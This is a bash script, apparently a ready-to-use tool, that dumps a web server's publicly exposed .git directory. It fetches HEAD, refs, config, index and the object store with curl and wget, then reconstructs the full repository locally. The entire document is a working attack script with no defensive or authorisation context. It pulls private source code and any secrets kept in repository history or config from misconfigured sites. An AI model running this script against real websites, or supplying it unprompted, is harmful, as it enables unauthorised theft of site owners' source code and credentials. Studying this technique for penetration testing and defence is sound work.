#!/bin/bash

# Usage: ./git-dump.sh http://example.com/.git

if [ -z "$1" ]; then
    echo "Usage: $0 <URL to .git folder>"
    exit 1
fi

TARGET="$1"
OUTDIR="git-dump"
mkdir -p "$OUTDIR/.git"
cd "$OUTDIR" || exit 1

# Helper to download a file and create necessary directories
fetch() {
    URL="$1"
    FILE=".git/${2}"
    mkdir -p "$(dirname "$FILE")"
    curl -s -f "$URL" -o "$FILE" && echo "Fetched $FILE"
}

echo "[*] Downloading HEAD..."
fetch "$TARGET/HEAD" "HEAD"

BRANCH=$(sed 's/ref: //' .git/HEAD)
echo "[*] Branch reference found: $BRANCH"

fetch "$TARGET/$BRANCH" "$BRANCH"

echo "[*] Downloading config, index, and refs..."
fetch "$TARGET/config" "config"
fetch "$TARGET/index" "index"

# Common branch references
for REF in master main dev; do
    fetch "$TARGET/refs/heads/$REF" "refs/heads/$REF"
done

echo "[*] Recursively downloading objects..."
wget -q -r -np -nH --cut-dirs=1 --reject "index.html*" "$TARGET/objects/" -P .git/

echo "[*] Attempting to rebuild repo..."

cd .. || exit 1
git init dumped-repo
cp -r git-dump/.git dumped-repo/
cd dumped-repo || exit 1
git reset --hard HEAD
echo "[✔] Done. Repo reconstructed in: dumped-repo/"
